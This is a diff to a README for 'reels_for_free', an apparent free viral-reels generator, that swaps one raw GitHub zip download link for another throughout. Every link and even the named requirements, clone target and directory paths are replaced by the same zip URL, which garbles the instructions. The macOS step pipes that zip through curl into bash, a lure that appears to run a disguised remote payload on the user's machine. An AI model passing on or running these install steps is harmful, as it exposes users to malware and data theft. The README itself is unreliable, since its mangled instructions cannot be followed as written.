@@ -1,13 +1,13 @@
 # 🎬 reels_for_free - Create Viral Reels Easily
 
 ## 🚀 Download Now
-[![Download](https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip)](https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip)
+[![Download](https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip)](https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip)
 
 ## 📋 Requirements
 
 Make sure your system meets the following requirements before installation:
 
-- **https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip**: Version 18 or higher
+- **https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip**: Version 18 or higher
 - **Python**: Version 3.8 or higher
 - **FFmpeg**: Required for media handling
 - **CUDA** (optional): For faster image generation
@@ -21,7 +21,7 @@ Follow these steps to install and run the application on **macOS**:
 Open your terminal and run:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip)"
 ```
 
 ### Step 2: Install Dependencies
@@ -40,13 +40,13 @@ Next, install the necessary Python package:
 pip3 install transparent-background
 ```
 
-### Step 4: Build https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip
+### Step 4: Build https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip
 
-Now, you need to clone and build the https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip repository:
+Now, you need to clone and build the https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip repository:
 
 ```bash
-git clone --recursive https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip
-cd https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip
+git clone --recursive https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip
+cd https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip
 mkdir build && cd build
 ```
 
@@ -95,7 +95,7 @@ You may need to configure environment variables. This step ensures that the appl
 
 To get the latest version of reels_for_free, visit the following page:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip)
 
 Once there, look for the latest release and download the appropriate file for your system.
 
@@ -109,7 +109,7 @@ Once there, look for the latest release and download the appropriate file for yo
 If you encounter any issues during installation or running the program, consider the following:
 
 - Ensure all dependencies are correctly installed.
-- Check that your https://raw.githubusercontent.com/aymankali1/reels_for_free/main/src/reels_for_free-2.8-alpha.4.zip and Python versions meet the minimum requirements.
+- Check that your https://raw.githubusercontent.com/aymankali1/reels_for_free/main/final-video/free_reels_for_v2.9.zip and Python versions meet the minimum requirements.
 - Review any error messages for clues on what might be wrong.
 
 For additional help, consult the issues section of our GitHub repository or community forums dedicated to this application.
